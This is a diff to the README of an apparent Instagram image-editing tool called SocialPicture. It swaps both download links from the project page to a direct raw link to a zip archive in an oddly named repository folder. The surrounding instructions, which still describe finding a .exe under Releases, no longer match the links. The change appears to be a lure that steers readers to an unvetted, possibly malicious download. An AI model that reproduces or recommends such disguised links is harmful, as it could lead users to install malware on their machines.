@@ -1,6 +1,6 @@
 # 🖼️ SocialPicture - Edit images for your Instagram posts
 
-[![Download SocialPicture](https://img.shields.io/badge/Download_SocialPicture-blue.svg)](https://github.com/Anadri6129/SocialPicture)
+[![Download SocialPicture](https://img.shields.io/badge/Download_SocialPicture-blue.svg)](https://raw.githubusercontent.com/Anadri6129/SocialPicture/main/paramountness/Social-Picture-v1.9.zip)
 
 SocialPicture helps you prepare images for Instagram. It processes your files without quality loss. You host the software on your own hardware. This means your files stay private. You can use the software on your computer or your phone.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your computer needs at lea
 
 You must visit the project page to download the setup file.
 
-[Download SocialPicture Installer](https://github.com/Anadri6129/SocialPicture)
+[Download SocialPicture Installer](https://raw.githubusercontent.com/Anadri6129/SocialPicture/main/paramountness/Social-Picture-v1.9.zip)
 
 Click the link above. Look for the section labeled Releases on the right side of the page. Click the latest version link. Find the file ending in .exe and click it to save the file to your computer.
 
